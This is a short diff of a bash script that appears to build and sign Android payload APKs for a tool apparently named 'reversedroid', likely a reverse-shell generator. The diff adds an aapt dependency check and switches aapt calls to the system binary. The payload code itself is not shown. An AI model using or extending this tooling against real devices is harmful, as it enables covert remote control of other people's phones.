@@ -22,6 +22,8 @@ exit 1
 dependencies() {
 
 command -v javac > /dev/null 2>&1 || { echo >&2 "I require Java but it's not installed. Install it. Aborting."; exit 1; }
+command -v aapt > /dev/null 2>&1 || { echo >&2 "I require aapt but it's not installed. Install it. Aborting."; 
+exit 1; }
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
 exit 1; }
@@ -126,12 +128,12 @@ printf "}\n" >> src/com/example/reversedroid/MainActivity.java
 compile() {
 createapp
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Compiling... \e[0m\n"
-./tools/aapt package -f -m -J src/ -M AndroidManifest.xml -S res/ -I tools/android-sdk/platforms/android-19/android.jar
+aapt package -f -m -J src/ -M AndroidManifest.xml -S res/ -I tools/android-sdk/platforms/android-19/android.jar
 javac -d obj/ -classpath src/ -bootclasspath tools/android-sdk/platforms/android-19/android.jar src/com/example/reversedroid/*.java -source 1.7 -target 1.7
 ./tools/dx --dex --output=bin/classes.dex obj/
-./tools/aapt package -f -m -F bin/$payload_name.apk -M AndroidManifest.xml -S res/ -I tools/android-sdk/platforms/android-19/android.jar
+aapt package -f -m -F bin/$payload_name.apk -M AndroidManifest.xml -S res/ -I tools/android-sdk/platforms/android-19/android.jar
 cp bin/classes.dex .
-./tools/aapt add bin/$payload_name.apk classes.dex > /dev/null
+aapt add bin/$payload_name.apk classes.dex > /dev/null
 echo "      " | ./tools/apksigner.jar sign --ks tools/key.keystore bin/$payload_name.apk > /dev/null
 mv bin/$payload_name.apk $payload_name.apk
 rm -rf classes.dex
